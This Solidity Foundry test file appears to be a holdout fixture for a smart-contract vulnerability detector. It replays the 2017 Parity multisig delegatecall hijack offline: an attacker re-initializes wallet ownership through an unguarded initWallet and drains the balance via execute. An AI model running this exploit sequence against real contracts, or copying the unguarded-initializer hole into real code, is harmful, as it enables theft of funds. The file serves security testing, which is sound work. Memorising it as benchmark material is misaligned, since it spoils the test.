// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {
    ParityWalletLibrary,
    ParityWalletProxy
} from "../fixtures/delegatecall-hijack/b-incident/ParityWalletClone.sol";

interface IParityWallet {
    function initWallet(address newOwner) external;
    function execute(address to, uint256 value) external;
    function owner() external view returns (address);
}

/// @title delegatecall-hijack (b) real-incident HOLDOUT fixture: Parity multisig (2017-07-19).
/// @notice Minimized OFFLINE replay of the documented delegatecall-hijack drain (no live RPC):
///         the wallet proxy delegatecalls a shared library whose unguarded `initWallet` is
///         reachable through the proxy, so an attacker re-initializes ownership to themselves and
///         `execute`s a withdrawal of the whole balance. Real on-chain addresses from the public
///         post-mortem are used for fidelity (see PROVENANCE.md). The verdict is derived from the
///         real outcome (the wallet's balance left it), not hardcoded.
///
///         HOLDOUT: authored after the wal detectors froze at v0.1 and wal was NOT tuned to pass
///         it (label=vuln -> expect VULNERABLE).
contract ParityWalletIncidentTest is Test {
    // Public, documented addresses (Etherscan + OpenZeppelin post-mortem).
    address constant ATTACKER = 0xB3764761E297D6f121e79C32A65829Cd1dDb4D32;
    address constant LEGIT_OWNER = address(0xA11CE);

    // The drained balance of the example victim wallet 0xBEc591De... (82,189.93 ETH).
    uint256 constant STOLEN_AMOUNT = 82_189_932_605_820_062_911_880;

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[delegatecall-hijack] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_parityWalletIncident_isDrained() public {
        ParityWalletLibrary lib = new ParityWalletLibrary();
        ParityWalletProxy proxy = new ParityWalletProxy(address(lib), LEGIT_OWNER);
        vm.deal(address(proxy), STOLEN_AMOUNT);

        uint256 balanceBefore = address(proxy).balance;
        assertEq(proxy.owner(), LEGIT_OWNER, "wallet should start owned by the legit owner");

        // Attack tx 0x9dbf0326...: attacker re-initializes ownership through the delegatecall
        // fallback (the unguarded initWallet), then drains via execute.
        vm.startPrank(ATTACKER);
        IParityWallet(address(proxy)).initWallet(ATTACKER);
        IParityWallet(address(proxy)).execute(ATTACKER, balanceBefore);
        vm.stopPrank();

        uint256 finalBalance = address(proxy).balance;
        bool drained = (balanceBefore > 0 && finalBalance == 0);
        _report("parity-wallet-library-victim", drained);

        assertTrue(drained, "incident replay should drain the wallet");
        assertEq(proxy.owner(), ATTACKER, "attacker should have hijacked ownership");
        assertEq(finalBalance, 0, "wallet should be emptied");
        assertEq(ATTACKER.balance, STOLEN_AMOUNT, "attacker should hold the drained balance");
    }
}
